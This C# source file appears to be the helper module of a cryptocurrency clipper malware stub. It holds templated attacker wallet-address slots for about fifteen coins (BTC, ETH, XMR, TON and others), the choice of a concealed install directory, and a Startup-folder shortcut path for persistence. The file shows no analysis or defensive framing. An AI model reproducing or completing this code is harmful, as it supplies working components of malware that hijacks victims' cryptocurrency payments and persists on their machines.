using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Stub.Help
{
    class HELP_String
    {
        public static DirectoryInfo workPatch = new DirectoryInfo(Path.Combine(SysDir(), Config.dir));
        public static FileInfo workFile = new FileInfo(Path.Combine(workPatch.FullName, Config.bin));
        public static string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
        public static Random rnd = new Random();
        public static int value = rnd.Next(2, 7);
        public static string fullPathlnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{Config.bin}.lnk");

        // SYS Dir Path
        public static Dictionary<string, string[]> addresses_wall = new Dictionary<string, string[]>()
        {
            {"btc", "[BTC]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"bc1", "[BC1]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"eth", "[ETH]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"xmr", "[XMR]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"xlm", "[XLM]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"xrp", "[XRP]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"ltc", "[LTC]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"nec", "[NEC]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"bch", "[BCH]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"dash", "[DASH]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"doge", "[DOGE]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"trx", "[TRX]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"zcash", "[ZCASH]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"bnb", "[BNB]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
            {"ton", "[TON]".Replace("%", "").Replace(" ", "").Trim().Split('|') },
        };

        public static string SysDir()
        {
            try
            {
                if (Config.sysDir == "0")
                    return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                else if (Config.sysDir == "1")
                    return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                else if (Config.sysDir == "2")
                    return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                else if (Config.sysDir == "3")
                    return Path.GetTempPath();
                else
                    return Application.StartupPath;
            }
            catch { return Application.StartupPath; }
        }
    }
}
